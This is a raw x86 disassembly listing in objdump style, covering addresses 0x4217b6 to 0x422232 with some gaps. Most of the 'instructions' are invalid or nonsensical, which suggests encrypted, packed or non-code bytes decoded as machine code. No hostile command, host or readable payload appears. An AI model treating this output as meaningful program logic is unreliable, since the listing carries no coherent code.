  4217b6:	add    eax,0xe1175058
  4217bb:	push   ss
  4217bc:	and    ebx,ecx
  4217be:	sub    ah,BYTE PTR [edi]
  4217c0:	repz aaa 
  4217c2:	mov    dh,0xc3
  4217c4:	int    0xaf
  4217c6:	ins    DWORD PTR es:[edi],dx
  4217c7:	adc    ebp,DWORD PTR [ebp-0x1b]
  4217ca:	out    dx,eax
  4217cb:	mov    ds:0x3f2b0009,eax
  4217d0:	add    eax,0xfabc920f
  4217d5:	ficomp WORD PTR [ebx+eax*2]
  4217d8:	rol    bh,1
  4217da:	xchg   esp,eax
  4217db:	inc    ebp
  4217dc:	fs je  0x4217e3
  4217df:	mov    eax,0x54f7bee1
  4217e4:	mov    edx,0xdd1b6fa8
  4217e9:	xlat   BYTE PTR ds:[ebx]
  4217ea:	int    0xb9
  4217ec:	mov    esp,ecx
  4217ee:	les    ebx,FWORD PTR [ebx]
  4217f0:	adc    DWORD PTR [esi+0x41],0xffffffc5
  4217f4:	in     al,dx
  4217f5:	push   ecx
  4217f6:	inc    ecx
  4217f7:	sbb    al,0xb8
  4217f9:	cdq    
  4217fa:	(bad)  
  4217fb:	push   ebx
  4217fc:	or     al,0x1b
  4217fe:	jb     0x42182d
  421800:	jb     0x4217db
  421802:	xlat   BYTE PTR ds:[ebx]
  421803:	mov    ds:0x45dd34a,eax
  421808:	sti    
  421809:	in     al,0xdd
  42180b:	stc    
  42180c:	sub    dh,BYTE PTR [ebx-0x5d5958c3]
  421812:	xchg   esp,eax
  421813:	jmp    DWORD PTR [eax-0x80]
  421816:	scas   eax,DWORD PTR es:[edi]
  421817:	lds    esp,FWORD PTR [ebp-0x10]
  42181a:	sar    edi,cl
  42181c:	in     al,0xa4
  42181e:	daa    
  42181f:	mov    al,0xd6
  421821:	jo     0x421815
  421823:	pop    eax
  421824:	in     al,dx
  421825:	add    dl,ch
  421827:	test   BYTE PTR [ecx-0x5a],0x88
  42182b:	inc    ebp
  42182c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42182d:	test   al,0x1f
  42182f:	lods   eax,DWORD PTR ds:[esi]
  421830:	mov    al,0x51
  421832:	in     al,dx
  421833:	pop    edx
  421834:	ret    
  421835:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421837:	mov    esi,0x15ec0cd6
  42183c:	mov    edx,esp
  42183e:	mov    edx,0xe9e04224
  421843:	repz daa 
  421845:	aam    0x5d
  421847:	jp     0x421883
  421849:	push   ecx
  42184a:	sbb    eax,0x118c3657
  42184f:	xor    eax,0x70a6173d
  421854:	lea    edi,[esi]
  421856:	aam    0xdf
  421858:	dec    ebp
  421859:	mov    cl,0xd
  42185b:	push   esp
  42185c:	pop    edx
  42185d:	xchg   ebp,eax
  42185e:	pop    edx
  42185f:	repz mov edi,0xabbe41de
  421865:	mov    edi,0x45aa70f9
  42186a:	pop    edi
  42186b:	jbe    0x421869
  42186d:	push   eax
	...
  4218d6:	shl    DWORD PTR [eax-0x6061f47],1
  4218dc:	fnstenv [ecx-0x359a0174]
  4218e2:	adc    DWORD PTR [ebp+ecx*1+0x168678e],ecx
  4218e9:	add    BYTE PTR [eax],al
  4218eb:	add    DWORD PTR [eax],eax
  4218ed:	add    BYTE PTR [ebx-0x6e],dl
  4218f0:	fnsave [esi+0x28ac2f71]
  4218f6:	push   eax
  4218f7:	ss xchg ebp,eax
  4218f9:	stos   BYTE PTR es:[edi],al
  4218fa:	repnz fwait
  4218fc:	mov    al,ds:0x8441f686
  421902:	cmp    eax,0x5fccddad
  421907:	cld    
  421908:	pushf  
  421909:	clc    
  42190a:	mov    dl,0x2c
  42190c:	aad    0xb1
  42190e:	out    0xf2,al
  421910:	lea    edx,[ecx]
  421912:	cmp    eax,0xa5a4c7f9
  421917:	and    al,0x9a
  421919:	sahf   
  42191a:	pop    ebx
  42191b:	loop   0x421934
  42191d:	(bad)  
  42191e:	xchg   edx,eax
  42191f:	cmp    eax,0xf956d2fe
  421924:	push   edi
  421925:	inc    edx
  421926:	scas   eax,DWORD PTR es:[edi]
  421927:	ds pop ss
  421929:	bound  edx,QWORD PTR [ebp+ebx*8-0x34]
  42192d:	nop
  42192e:	inc    esi
  42192f:	cdq    
  421930:	inc    edi
  421931:	sbb    ebp,eax
  421933:	hlt    
  421934:	dec    DWORD PTR [edx+0x758c363f]
  42193a:	sahf   
  42193b:	(bad)  
  42193c:	and    BYTE PTR [edi],0x4
  42193f:	mov    eax,ds:0x45807756
  421944:	inc    esp
  421945:	shr    BYTE PTR [eax+0x6a],cl
  421948:	test   DWORD PTR [ecx+0x4e],eax
  42194b:	test   DWORD PTR [ebp+ecx*8+0x28],eax
  42194f:	mov    bh,0x8f
  421951:	mov    ebp,0x920eaa7d
  421956:	xchg   eax,eax
  421958:	inc    edx
  421959:	push   ebx
  42195a:	sub    eax,0xc40bb735
  42195f:	vmread DWORD PTR [ecx+esi*1],esi
  421963:	xor    DWORD PTR [eax+0x23],ebx
  421966:	mov    ds:0x139a2585,eax
  42196b:	mov    edi,0x776072c6
  421970:	(bad)  
  421971:	fstp   TBYTE PTR [edx+eax*4-0xf]
  421975:	iret   
  421976:	mov    eax,ecx
  421978:	sub    eax,DWORD PTR [ecx-0x3e]
  42197b:	inc    ebp
  42197c:	fdiv   QWORD PTR [eax]
  42197e:	adc    esi,DWORD PTR [ecx+0xe7042d]
  421984:	sbb    DWORD PTR [esi+0x4fbd7781],0x46f5a361
  42198e:	push   eax
  42198f:	loope  0x4219d2
  421991:	out    dx,al
  421992:	mov    edx,0xdac9fa7
  421997:	dec    esp
  421998:	push   esp
  421999:	jmp    0xb538e56
  42199e:	lock nop
  4219a0:	sbb    al,0xe8
  4219a2:	pop    edi
  4219a3:	xchg   edx,eax
  4219a4:	cdq    
  4219a5:	pop    eax
  4219a6:	xor    DWORD PTR [edi-0x9085b0],eax
  4219ac:	sahf   
  4219ad:	sub    eax,0x306595d
  4219b2:	mov    eax,0x6194c38c
  4219b7:	aas    
  4219b8:	push   ds
  4219b9:	aam    0x5d
  4219bb:	imul   edi,ecx,0x28
  4219be:	scas   al,BYTE PTR es:[edi]
  4219bf:	imul   ecx,DWORD PTR [esi+0x39b7b93a],0xf5a1185a
  4219c9:	fld    QWORD PTR [edx+0xad3ee82]
  4219cf:	sub    dh,ch
  4219d1:	mov    edi,0x983b35e3
  4219d6:	inc    eax
  4219d7:	add    DWORD PTR [esi+eax*1+0x5cf510cd],ecx
  4219de:	jns    0x4219f5
  4219e0:	ins    BYTE PTR es:[edi],dx
  4219e1:	push   0xffffffe7
  4219e3:	popf   
  4219e4:	mov    ds:0x65ca7420,al
  4219e9:	repz and edi,ebx
  4219ec:	dec    esi
  4219ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	mov    ecx,0x671ed3ad
  421a67:	imul   eax,DWORD PTR [ecx],0x10000
  421a6d:	add    BYTE PTR [eax-0x71],dl
  421a70:	fisttp DWORD PTR [ebx]
  421a72:	mov    ecx,0x8f3783be
  421a77:	idiv   BYTE PTR [edi-0x5c]
  421a7a:	es jb  0x421ad9
  421a7d:	or     eax,0xc786375e
  421a82:	add    cl,BYTE PTR [ebp+0x18]
  421a85:	xchg   ebp,eax
  421a86:	mov    dl,0xfc
  421a88:	outs   dx,BYTE PTR ds:[esi]
  421a89:	into   
  421a8a:	loopne 0x421aa6
  421a8c:	je     0x421ac6
  421a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8f:	xchg   cx,ax
  421a91:	inc    edx
  421a92:	adc    ecx,eax
  421a94:	repnz loopne 0x421a21
  421a97:	fldcw  WORD PTR [ebp+0x5f]
  421a9a:	ror    DWORD PTR [edx+edi*8+0x3e05f8cd],0x36
  421aa2:	adc    al,0x1c
  421aa4:	xchg   ebp,eax
  421aa5:	icebp  
  421aa6:	push   ecx
  421aa7:	stc    
  421aa8:	or     eax,DWORD PTR [eax+edi*4-0xd]
  421aac:	sub    BYTE PTR [ecx-0x7],bl
  421aaf:	pop    esp
  421ab0:	fmul   DWORD PTR [esi-0x5e]
  421ab3:	cmp    DWORD PTR [edx-0x33d1547d],ebx
  421ab9:	push   edx
  421aba:	jo     0x421ac9
  421abc:	imul   DWORD PTR [edi-0x17927921]
  421ac2:	and    BYTE PTR [eax+0x746a5649],bh
  421ac8:	mov    dl,0x8a
  421aca:	jne    0x421aa2
  421acc:	adc    dl,dh
  421ace:	out    0x5e,al
  421ad0:	ss aam 0x72
  421ad3:	mov    edx,0x44bca053
  421ad8:	jbe    0x421ac4
  421ada:	mov    ah,0x2f
  421adc:	pop    ebp
  421add:	ret    0x84f8
  421ae0:	mov    dl,0xd8
  421ae2:	xchg   esi,eax
  421ae3:	pop    edx
  421ae4:	xchg   ecx,eax
  421ae5:	cmp    dl,BYTE PTR [ecx+0x205a2563]
  421aeb:	arpl   WORD PTR [edx-0x5fd49a1e],dx
  421af1:	(bad)  ds:0xefd0856c
  421af7:	leave  
  421af8:	out    0xe4,eax
  421afa:	inc    edx
  421afb:	iret   
  421afc:	or     esp,DWORD PTR [ebx-0x56]
  421aff:	dec    edx
  421b00:	fiadd  DWORD PTR [esi]
  421b02:	jo     0x421b6d
  421b04:	iret   
  421b05:	mov    dh,0xa8
  421b07:	pop    edx
  421b08:	jecxz  0x421af0
  421b0a:	imul   ecx,DWORD PTR [edi-0x4c5ca410],0xec3f7eae
  421b14:	and    al,0xa8
  421b16:	add    esi,esp
  421b18:	pop    esi
  421b19:	sub    ch,BYTE PTR [ebp-0x4]
  421b1c:	inc    ecx
  421b1d:	das    
  421b1e:	(bad)  
  421b1f:	daa    
  421b20:	jl     0x421b69
  421b22:	int3   
  421b23:	xchg   esp,eax
  421b24:	add    DWORD PTR [ecx-0x10740ce1],esi
  421b2a:	sub    BYTE PTR [edx+0x72a06052],dl
  421b30:	fdivr  QWORD PTR [esi+esi*2]
  421b33:	and    bl,BYTE PTR [ebp+0x13d75d8a]
  421b39:	call   0x6accea90
  421b3e:	nop
  421b3f:	dec    edx
  421b40:	mov    ds:0x1c8300,eax
  421b45:	pop    ebx
  421b46:	call   0x101f:0x7063ba40
  421b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b4e:	push   ebp
  421b4f:	scas   eax,DWORD PTR es:[edi]
  421b50:	push   edi
  421b51:	aad    0xfb
  421b53:	aam    0x6a
  421b55:	inc    edi
  421b56:	enter  0x5959,0x1
  421b5a:	int    0x31
  421b5c:	dec    ebp
  421b5d:	push   esi
  421b5e:	jmp    0x56bf:0x685dd38c
  421b65:	sbb    DWORD PTR [edi],edx
  421b67:	jne    0x421bc3
  421b69:	repnz mov bh,0xdc
  421b6c:	cmp    eax,0x3
	...
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     cl,dl
  421be3:	mov    DWORD PTR [ecx+edx*1+0x67],ecx
  421be7:	push   0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [esi+0x614e58b9],ch
  421bf3:	pop    ds
  421bf4:	xor    DWORD PTR [eax+0x531af66c],edi
  421bfa:	mov    bh,0x33
  421bfc:	inc    ebp
  421bfd:	jmp    DWORD PTR [ebx+edi*8]
  421c00:	xchg   ebx,eax
  421c01:	mov    ecx,0x3820edc8
  421c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c07:	sbb    dh,BYTE PTR [edx]
  421c09:	add    ah,BYTE PTR [esi+0x7f614f5b]
  421c0f:	inc    ebp
  421c10:	mov    ebx,0x8bd36a1d
  421c15:	sbb    eax,0x9efff302
  421c1a:	sub    DWORD PTR [esi-0x66],edx
  421c1d:	jo     0x421bb4
  421c1f:	sar    BYTE PTR [eax],cl
  421c21:	jnp    0x421bfa
  421c23:	ins    BYTE PTR es:[edi],dx
  421c24:	in     eax,0xde
  421c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c27:	retf   0xfea2
  421c2a:	ror    DWORD PTR [edi],0xcb
  421c2d:	jmp    0x421bf6
  421c2f:	or     al,BYTE PTR [ecx]
  421c31:	cmp    eax,0xa113d72a
  421c36:	add    bh,BYTE PTR [eax+0x799f7851]
  421c3c:	aad    0x21
  421c3e:	rol    DWORD PTR [edi+ebp*4-0x27f86c7f],0x4e
  421c46:	xchg   esp,eax
  421c47:	lods   al,BYTE PTR ds:[esi]
  421c48:	sbb    ch,BYTE PTR [esi+0x4cda0ff5]
  421c4e:	imul   ecx,DWORD PTR [edi+0x511e95e5],0x92c7e88b
  421c58:	imul   esp,DWORD PTR [ebx-0x3c],0xbcf4d22d
  421c5f:	pop    edx
  421c60:	xchg   ecx,eax
  421c61:	arpl   dx,ax
  421c63:	and    DWORD PTR [esi+0x1c],ebx
  421c66:	xchg   ebp,eax
  421c67:	aaa    
  421c68:	lahf   
  421c69:	pop    ecx
  421c6a:	jl     0x421c8d
  421c6c:	daa    
  421c6d:	jbe    0x421cec
  421c6f:	lods   eax,DWORD PTR ds:[esi]
  421c70:	mov    edx,0xcd5c538c
  421c75:	jae    0x421c3d
  421c77:	push   eax
  421c78:	lock mov ah,al
  421c7b:	xchg   BYTE PTR [edx],bl
  421c7d:	ror    bh,1
  421c7f:	mov    eax,ds:0xa1725aa5
  421c84:	cmp    ecx,DWORD PTR [edx-0x127d1712]
  421c8a:	pop    ss
  421c8b:	scas   eax,DWORD PTR es:[edi]
  421c8c:	(bad)  
  421c8d:	icebp  
  421c8e:	not    DWORD PTR [eax-0x54da546c]
  421c94:	aad    0x1a
  421c96:	or     ch,al
  421c98:	fisttp QWORD PTR [ebp+0x3689065d]
  421c9e:	and    al,0x8
  421ca0:	sub    eax,0x8d2b6dd9
  421ca5:	cli    
  421ca6:	lock cmp BYTE PTR [edi],dh
  421ca9:	mov    ecx,0x9758d435
  421cae:	dec    esp
  421caf:	retf   
  421cb0:	inc    ebx
  421cb1:	jl     0x421cae
  421cb3:	out    dx,eax
  421cb4:	rcr    DWORD PTR [eax-0x38bcf229],0xc8
  421cbb:	add    al,0x4d
  421cbd:	xor    eax,0xae7e84c
  421cc2:	and    dl,cl
  421cc4:	add    eax,eax
  421cc6:	xchg   edx,eax
  421cc7:	aad    0xf6
  421cc9:	sbb    al,0x93
  421ccb:	or     BYTE PTR [edi-0x142cf596],0x4c
  421cd2:	int3   
  421cd3:	gs fcmovb st,st(7)
  421cd6:	call   0xa9b57234
  421cdb:	cmp    BYTE PTR [esp+ebx*4],ah
  421cde:	ret    0x7954
  421ce1:	pop    edi
  421ce2:	(bad)  
  421ce3:	rcl    dl,1
  421ce5:	jg     0x421d66
  421ce7:	xchg   edx,eax
  421ce8:	in     eax,dx
  421ce9:	inc    esi
  421cea:	sub    al,0x13
  421cec:	popa   
  421ced:	hlt    
	...
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	cmp    edx,DWORD PTR [edi]
  421d64:	xchg   ecx,eax
  421d65:	dec    ecx
  421d66:	imul   eax,DWORD PTR [bx+di],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	and    dh,BYTE PTR [edx-0x5d]
  421d71:	retf   0x9e59
  421d74:	xchg   edi,eax
  421d75:	jp     0x421dde
  421d77:	loopne 0x421dc4
  421d79:	out    0x85,al
  421d7b:	xchg   ecx,eax
  421d7c:	arpl   WORD PTR [eax+0x24a7fe7f],bx
  421d82:	fdivr  DWORD PTR [eax]
  421d84:	hlt    
  421d85:	pop    esp
  421d86:	jmp    0x421d49
  421d88:	imul   BYTE PTR [ecx+0x49a3e78d]
  421d8e:	xchg   ebp,eax
  421d8f:	call   0x1a04:0x9af4ca23
  421d96:	push   ebx
  421d97:	scas   eax,DWORD PTR es:[edi]
  421d98:	cli    
  421d99:	in     eax,0x7f
  421d9b:	pop    esi
  421d9c:	inc    ebp
  421d9d:	xchg   ah,ah
  421d9f:	pop    esp
  421da0:	fidiv  DWORD PTR [edx]
  421da2:	and    eax,0x2b113121
  421da7:	dec    ebp
  421da8:	and    BYTE PTR [ebx+0x623f7668],ah
  421dae:	jae    0x421db6
  421db0:	push   ss
  421db1:	clc    
  421db2:	pushf  
  421db3:	fisttp DWORD PTR [edi+eax*2]
  421db6:	mov    BYTE PTR [ebx],bl
  421db8:	pop    ebp
  421db9:	ins    BYTE PTR es:[edi],dx
  421dba:	inc    eax
  421dbb:	aad    0xbc
  421dbd:	cdq    
  421dbe:	cld    
  421dbf:	sti    
  421dc0:	(bad)  
  421dc1:	mov    ds:0x8690b23a,eax
  421dc6:	adc    esp,ecx
  421dc8:	xor    eax,0x5986eb0e
  421dcd:	xchg   edx,eax
  421dce:	cmp    eax,0x5355e7ca
  421dd3:	mov    edi,0x842a4ef5
  421dd8:	fidivr DWORD PTR [edi-0x2d93ca20]
  421dde:	test   DWORD PTR [ecx-0x48],eax
  421de1:	and    BYTE PTR [edx-0x353f5dec],dl
  421de7:	mov    bh,BYTE PTR cs:[esi]
  421dea:	sbb    al,0xc5
  421dec:	mov    bh,0x99
  421dee:	xor    DWORD PTR [ecx+edi*4+0x58],esp
  421df2:	push   es
  421df3:	and    eax,0x9f6dca21
  421df8:	fld    TBYTE PTR [esi+0x14]
  421dfb:	bound  esp,QWORD PTR [ebx+0x2a053312]
  421e01:	xchg   ebx,eax
  421e02:	mov    bl,0x95
  421e04:	ja     0x421e29
  421e06:	mov    ds:0xbd75dc04,al
  421e0b:	push   esi
  421e0c:	adc    DWORD PTR [ebx-0x6a],0x71
  421e10:	mov    dl,0x4e
  421e12:	sbb    esp,eax
  421e14:	push   0x2b
  421e16:	rcr    BYTE PTR [edx-0x42],0xf6
  421e1a:	stc    
  421e1b:	mov    edi,0x5b63477f
  421e20:	std    
  421e21:	jae    0x421e29
  421e23:	xor    dh,0x7a
  421e26:	xor    bh,cl
  421e28:	sbb    eax,0x6105da16
  421e2d:	dec    esp
  421e2e:	xor    DWORD PTR [ebp+ebx*4-0x5384e735],eax
  421e35:	aam    0xbf
  421e37:	pop    esp
  421e38:	push   0xffffffd6
  421e3a:	les    esp,FWORD PTR [ecx]
  421e3c:	inc    ecx
  421e3d:	iret   
  421e3e:	adc    bh,BYTE PTR [ecx+0x39]
  421e41:	cmp    eax,0xd4c2f59a
  421e46:	retf   0x1065
  421e49:	push   ebx
  421e4a:	xor    al,0x3c
  421e4c:	loope  0x421de0
  421e4e:	xor    BYTE PTR fs:[ecx-0x2460f48c],cl
  421e55:	xor    dl,BYTE PTR [eax]
  421e57:	sub    dh,bh
  421e59:	aas    
  421e5a:	test   DWORD PTR [edi],edx
  421e5c:	cmp    al,0x19
  421e5e:	ror    BYTE PTR [edx-0x64],cl
  421e61:	sti    
  421e62:	mov    ebx,DWORD PTR [ebx+ecx*2-0x51ee0dc0]
  421e69:	pop    edi
  421e6a:	and    al,0x52
  421e6c:	test   DWORD PTR [edx+0x0],ecx
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	fstp   DWORD PTR [eax-0x2a]
  421ee5:	stc    
  421ee6:	ins    BYTE PTR es:[di],dx
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	fs in  al,0xc0
  421ef1:	mov    al,0xb1
  421ef3:	popa   
  421ef4:	imul   ebx,DWORD PTR [eax],0xffffffbc
  421ef7:	sbb    cl,BYTE PTR [ecx-0x22c52809]
  421efd:	stos   BYTE PTR es:[edi],al
  421efe:	pop    ss
  421eff:	mov    esi,0x8807bdb3
  421f04:	dec    esp
  421f05:	sub    al,0x9c
  421f07:	add    ah,BYTE PTR [esi-0x57]
  421f0a:	add    BYTE PTR [eax],bl
  421f0c:	inc    edx
  421f0d:	xchg   esi,eax
  421f0e:	rcl    eax,1
  421f10:	add    BYTE PTR [esi],ch
  421f12:	int    0x41
  421f14:	jge    0x421f53
  421f16:	mov    cl,ah
  421f18:	(bad)  
  421f19:	loop   0x421f2b
  421f1b:	bound  ebx,QWORD PTR [eax+0x41]
  421f1e:	cmp    BYTE PTR es:[edx+0x2a015404],cl
  421f25:	inc    ecx
  421f26:	mov    edx,0xc08bc4f9
  421f2b:	icebp  
  421f2c:	retf   0xce33
  421f2f:	nop
  421f30:	jg     0x421ee7
  421f32:	mov    esi,0xe8f51232
  421f37:	jns    0x421f64
  421f39:	mov    bl,0xa0
  421f3b:	sar    DWORD PTR [esi+0x712207bb],0x15
  421f42:	outs   dx,DWORD PTR ds:[esi]
  421f43:	sbb    BYTE PTR [ebx+0x1fa33b49],cl
  421f49:	pop    ebp
  421f4a:	dec    edx
  421f4b:	mov    ch,0x4f
  421f4d:	lea    esi,[edx+0x20]
  421f50:	xor    eax,DWORD PTR [edi-0x5e3a0a54]
  421f56:	std    
  421f57:	cmp    ebx,ebp
  421f59:	mov    esp,0xb19b5023
  421f5e:	out    0x7a,eax
  421f60:	push   0x9d16c7cc
  421f65:	enter  0xa96e,0xfd
  421f69:	sahf   
  421f6a:	sbb    BYTE PTR [edx],al
  421f6c:	pop    ebx
  421f6d:	aaa    
  421f6e:	cli    
  421f6f:	pop    esi
  421f70:	inc    edx
  421f71:	call   DWORD PTR [ebx]
  421f73:	in     al,0x9f
  421f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f76:	pop    ecx
  421f77:	or     ecx,DWORD PTR [ebp+0x541299ef]
  421f7d:	xchg   esi,eax
  421f7e:	mov    ds:0x2d03ed9e,eax
  421f83:	retf   0xec11
  421f86:	push   es
  421f87:	fcomp  QWORD PTR ds:0xd94bf55
  421f8d:	push   DWORD PTR [ecx]
  421f8f:	fdiv   QWORD PTR [esi-0x25a2c92]
  421f95:	aas    
  421f96:	in     eax,0xc7
  421f98:	xor    esp,ebp
  421f9a:	sbb    ebp,DWORD PTR [esi]
  421f9c:	jge    0x421fce
  421f9e:	cs test cl,ah
  421fa1:	loope  0x421f43
  421fa3:	add    al,0xf7
  421fa5:	je     0x421f9d
  421fa7:	je     0x422007
  421fa9:	ins    BYTE PTR es:[edi],dx
  421faa:	loope  0x421f8e
  421fac:	not    DWORD PTR [eax]
  421fae:	add    DWORD PTR [edi+0x10],edx
  421fb1:	mov    dh,0xf
  421fb3:	data16 mov cl,0x94
  421fb6:	cmp    dh,BYTE PTR [edx+0x5bb71a80]
  421fbc:	sub    dh,dh
  421fbe:	repnz mov bl,0x83
  421fc1:	jb     0x421f6f
  421fc3:	sbb    eax,0x1eff5068
  421fc8:	pop    ecx
  421fc9:	enter  0x3e0d,0xc8
  421fcd:	mov    eax,ds:0xe3ef89cc
  421fd2:	push   0x34
  421fd4:	sub    BYTE PTR [edi-0x7],dl
  421fd7:	mov    ah,0xd5
  421fd9:	lea    edx,[eax+ebx*1+0x5]
  421fdd:	and    esp,esp
  421fdf:	xchg   ebp,eax
  421fe0:	call   0x3491cf0a
  421fe5:	dec    ecx
  421fe6:	ins    BYTE PTR es:[edi],dx
  421fe7:	sahf   
  421fe8:	lea    ebp,[eax+0x38]
  421feb:	dec    ebx
  421fec:	jb     0x421f75
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	data16 int3 
  422063:	stc    
  422064:	mov    edi,0x16d67f1
  422069:	add    BYTE PTR [eax],al
  42206b:	add    DWORD PTR [eax],eax
  42206d:	add    ah,cl
  42206f:	ss jno 0x422030
  422072:	stc    
  422073:	xor    BYTE PTR [esi+0x56],0x8c
  422077:	in     eax,dx
  422078:	cmp    DWORD PTR [eax-0x46bc82d3],edx
  42207e:	add    al,BYTE PTR [eax+0x30]
  422081:	and    al,0x9c
  422083:	xchg   esp,eax
  422084:	mov    WORD PTR [eax],ds
  422086:	pop    esi
  422087:	int    0x81
  422089:	sbb    eax,0x6cdb6057
  42208e:	jno    0x4220ed
  422090:	inc    esp
  422091:	push   edx
  422092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422093:	xor    eax,0x4b709e2
  422098:	ins    DWORD PTR es:[edi],dx
  422099:	push   ss
  42209a:	inc    ebp
  42209b:	push   cs
  42209c:	push   esi
  42209d:	mov    ds:0x5c004199,al
  4220a2:	mov    eax,ds:0xfde60c03
  4220a7:	adc    BYTE PTR [ecx-0x50],bl
  4220aa:	add    eax,0x3bb629ff
  4220af:	pop    es
  4220b0:	aam    0x57
  4220b2:	test   eax,0xb3d971ef
  4220b7:	mov    eax,ds:0x9444d8b2
  4220bc:	xchg   ebx,eax
  4220bd:	lock xor al,BYTE PTR ds:0x44812fa4
  4220c4:	aas    
  4220c5:	push   ebx
  4220c6:	mov    al,0xa
  4220c8:	fcom   QWORD PTR [esi]
  4220ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220cb:	in     al,0x9a
  4220cd:	inc    edi
  4220ce:	icebp  
  4220cf:	enter  0x2a52,0xbf
  4220d3:	inc    esi
  4220d4:	ins    BYTE PTR es:[edi],dx
  4220d5:	inc    BYTE PTR [esi-0x60134bf5]
  4220db:	jnp    0x4220b5
  4220dd:	mov    ?,WORD PTR [esi+0x40]
  4220e0:	or     dl,bh
  4220e2:	jnp    0x422071
  4220e4:	outs   dx,BYTE PTR ds:[esi]
  4220e5:	clc    
  4220e6:	sbb    dh,BYTE PTR [esi+0xfcd5973]
  4220ec:	xchg   edi,eax
  4220ed:	add    edi,0x2b2e9283
  4220f3:	jo     0x4220bb
  4220f5:	and    eax,0xf1c38bd9
  4220fa:	addr16 mov eax,ds:0x8a7b
  4220fe:	sbb    BYTE PTR [esi],bh
  422100:	jns    0x42210f
  422102:	push   ebx
  422103:	add    dl,cl
  422105:	outs   dx,DWORD PTR ds:[esi]
  422106:	pop    ecx
  422107:	mov    cl,0xc9
  42210a:	std    
  42210b:	jle    0x42211c
  42210d:	ins    BYTE PTR es:[edi],dx
  42210e:	idiv   BYTE PTR [ecx]
  422110:	inc    esp
  422111:	aas    
  422112:	mov    bl,0x37
  422114:	sub    ch,BYTE PTR [esi+0x712de7e7]
  42211a:	ret    
  42211b:	popf   
  42211c:	cmp    dl,BYTE PTR [ecx]
  42211e:	push   edi
  42211f:	dec    esp
  422120:	in     eax,0xbf
  422122:	push   ss
  422123:	scas   al,BYTE PTR es:[edi]
  422124:	iret   
  422125:	aam    0x7e
  422127:	leave  
  422128:	icebp  
  422129:	pushf  
  42212a:	pop    ecx
  42212b:	setp   BYTE PTR [edx-0x56]
  42212f:	ret    0xaf35
  422132:	add    BYTE PTR [ecx],ch
  422134:	jmp    0x4221a2
  422136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422137:	mov    esp,0x4d52e0dd
  42213c:	add    eax,0xc9cd5584
  422141:	mov    ah,0x66
  422143:	jmp    0xfba2313d
  422148:	and    BYTE PTR [ebx-0x5a],0x94
  42214c:	adc    al,0x28
  42214e:	mov    edi,0xe4c71b72
  422153:	dec    edi
  422154:	mov    ebx,0x9d5f612a
  422159:	nop
  42215a:	in     eax,0x77
  42215c:	inc    esp
  42215d:	ins    DWORD PTR es:[edi],dx
  42215e:	mov    ecx,edi
  422160:	retf   
  422161:	rol    BYTE PTR [edx+0x47],0x26
  422165:	adc    eax,0x77690056
  42216a:	or     BYTE PTR [ebx-0x77],ah
  42216d:	out    0x0,al
	...
  4221d3:	add    BYTE PTR [eax],al
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ebx,esi
  4221e3:	repnz mov eax,ds:0x16e6700
  4221e9:	add    BYTE PTR [eax],al
  4221eb:	add    DWORD PTR [eax],eax
  4221ed:	add    BYTE PTR [ebx+0x42a078d5],al
  4221f3:	mov    cl,0xb5
  4221f5:	mov    dl,0x23
  4221f7:	jle    0x42222b
  4221f9:	push   eax
  4221fa:	(bad)  
  4221fc:	jl     0x42218b
  4221fe:	cmp    eax,0x5b858fb2
  422203:	push   ss
  422204:	scas   eax,DWORD PTR es:[edi]
  422205:	xchg   esp,eax
  422206:	(bad)  
  422207:	adc    bl,cl
  422209:	sbb    eax,0xaf9bb27d
  42220e:	add    DWORD PTR [edi-0x40],ebp
  422211:	outs   dx,DWORD PTR ds:[esi]
  422212:	dec    ebp
  422213:	inc    eax
  422214:	mov    ebx,DWORD PTR [ebx+0x5e]
  422217:	ret    
  422218:	js     0x42219b
  42221a:	lods   eax,DWORD PTR ds:[esi]
  42221b:	or     al,0x1f
  42221d:	lea    edi,[eax]
  42221f:	pop    edx
  422220:	inc    ebx
  422221:	xchg   DWORD PTR [esi-0x2ce89637],eax
  422227:	hlt    
  422228:	mov    ebx,0x9a8b3bf7
  42222d:	add    dl,BYTE PTR [edx]
  42222f:	test   al,0x26
  422231:	stos   DWORD PTR es:[edi],eax
  422232:	ret    0x48f7
